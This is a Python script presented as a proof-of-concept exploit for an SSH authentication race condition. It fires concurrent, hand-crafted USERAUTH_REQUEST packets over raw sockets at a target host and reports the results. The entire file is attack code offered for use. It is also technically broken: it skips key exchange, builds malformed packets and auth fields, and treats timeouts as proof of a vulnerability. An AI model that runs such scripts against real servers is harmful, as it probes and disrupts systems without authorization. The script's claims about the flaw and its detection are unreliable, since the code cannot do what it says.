#!/usr/bin/env python3
"""
Proof-of-Concept: Authentication State Flush Race Condition (RFC 4252)

This script demonstrates a race condition vulnerability where an attacker sends
concurrent SSH authentication requests with changing usernames/services. According
to RFC 4252 Section 5, the server MUST flush accumulated authentication states if
the username or service name changes. If this flushing is not atomic relative to
request processing, it may lead to inconsistent state or bypassed checks.

Note: This PoC targets implementations that allow pipelined auth requests without
proper serialization of state management.
"""

import socket
import struct
import threading
import time
import sys
from typing import List, Tuple

class SSHAuthRaceExploit:
    def __init__(self, host: str, port: int = 22):
        self.host = host
        self.port = port
        self.results = []
        self.lock = threading.Lock()
        
    def _create_ssh_packet(self, msg_type: int, payload: bytes) -> bytes:
        """
        Create a raw SSH packet structure.
        Format: length(4) + padding_length(1) + payload + padding
        """
        # Add minimal padding to make payload size multiple of 8/16 if needed
        padding_len = (8 - (len(payload) % 8)) % 8
        padded_payload = payload + b'\x00' * padding_len
        
        length = len(padded_payload) + 1  # +1 for padding_length byte
        packet = struct.pack('>I', length) + struct.pack('B', padding_len) + padded_payload
        return packet
    
    def _create_auth_request(self, username: str, service: str, method: str) -> bytes:
        """
        Create SSH_MSG_USERAUTH_REQUEST message (Type 50)
        Format: byte(SSH_MSG_USERAUTH_REQUEST), string(user), string(service), string(method), ...
        """
        msg_type = 50  # SSH_MSG_USERAUTH_REQUEST
        
        # Pack strings with length prefix
        user_bytes = username.encode('utf-8')
        service_bytes = service.encode('ascii')
        method_bytes = method.encode('ascii')
        
        payload = struct.pack('>B', msg_type)
        payload += struct.pack('>I', len(user_bytes)) + user_bytes
        payload += struct.pack('>I', len(service_bytes)) + service_bytes
        payload += struct.pack('>I', len(method_bytes)) + method_bytes
        # Add empty password for 'password' method or publickey blob for 'publickey'
        if method == "password":
            payload += b"\x00"  # Empty password placeholder
        
        return self._create_ssh_packet(msg_type, payload)
    
    def _send_concurrent_requests(self, usernames: List[str], service_name: str = "ssh-connection"):
        """
        Send multiple authentication requests concurrently with different usernames.
        This exploits the race condition where state flushing may not be atomic.
        """
        threads = []
        
        for i, username in enumerate(usernames):
            # Vary method slightly to trigger different code paths
            method = "password" if i % 2 == 0 else "publickey"
            packet = self._create_auth_request(username, service_name, method)
            
            thread = threading.Thread(
                target=self._send_single_request,
                args=(packet, username),
                daemon=True
            )
            threads.append(thread)
        
        # Start all threads nearly simultaneously to maximize race window
        for t in threads:
            t.start()
        
        # Wait for completion
        for t in threads:
            t.join(timeout=5.0)
    
    def _send_single_request(self, packet: bytes, username: str):
        """
        Send a single authentication request via raw socket.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((self.host, self.port))
            
            # Note: In real SSH, we'd need to complete key exchange first.
            # This PoC assumes we're targeting a debug/test server that accepts
            # direct auth packets or has already completed handshake.
            # For demonstration purposes, we send the crafted packet directly.
            sock.sendall(packet)
            
            # Try to read response
            try:
                response = sock.recv(1024)
                if response:
                    with self.lock:
                        self.results.append({
                            'username': username,
                            'status': 'response_received',
                            'data_len': len(response)
                        })
            except socket.timeout:
                with self.lock:
                    self.results.append({
                        'username': username,
                        'status': 'timeout'
                    })
            
            sock.close()
        except Exception as e:
            with self.lock:
                self.results.append({
                    'username': username,
                    'status': f'error: {str(e)}'
                })
    
    def run_exploit(self, num_requests: int = 10):
        """
        Execute the race condition exploit.
        """
        print(f"[*] Initiating Authentication State Flush Race Attack")
        print(f"[*] Target: {self.host}:{self.port}")
        print(f"[*] Sending {num_requests} concurrent authentication requests...")
        
        # Generate unique usernames to trigger state flush on each request
        usernames = [f"user_{i}_{int(time.time()*1000)}" for i in range(num_requests)]
        
        start_time = time.time()
        self._send_concurrent_requests(usernames)
        elapsed = time.time() - start_time
        
        print(f"[+] Completed in {elapsed:.3f} seconds")
        print(f"[+] Results collected: {len(self.results)}")
        
        # Analyze results for race condition indicators
        self._analyze_results()
    
    def _analyze_results(self):
        """
        Analyze responses to detect potential race condition outcomes.
        """
        print("\n[*] Analysis of Results:")
        print("-" * 40)
        
        # Look for inconsistent states or missing flush acknowledgments
        timeouts = [r for r in self.results if r.get('status') == 'timeout']
        errors = [r for r in self.results if 'error' in r.get('status', '')]
        responses = [r for r in self.results if r.get('status') == 'response_received']
        
        print(f"  Responses received: {len(responses)}")
        print(f"  Timeouts: {len(timeouts)}")
        print(f"  Errors: {len(errors)}")
        
        if len(timeouts) > len(self.results) * 0.5:
            print("\n[!] POTENTIAL VULNERABILITY DETECTED:")
            print("    High timeout rate suggests server state inconsistency.")
            print("    The race condition may have caused the server to enter")
            print("    an inconsistent authentication state.")
        elif len(errors) > 0:
            print("\n[!] SERVER INSTABILITY OBSERVED:")
            print("    Errors indicate potential crash or disconnect due to")
            print("    improper handling of concurrent auth requests.")
        else:
            print("\n[-] No obvious race condition indicators detected.")
            print("    The server may properly serialize authentication requests.")

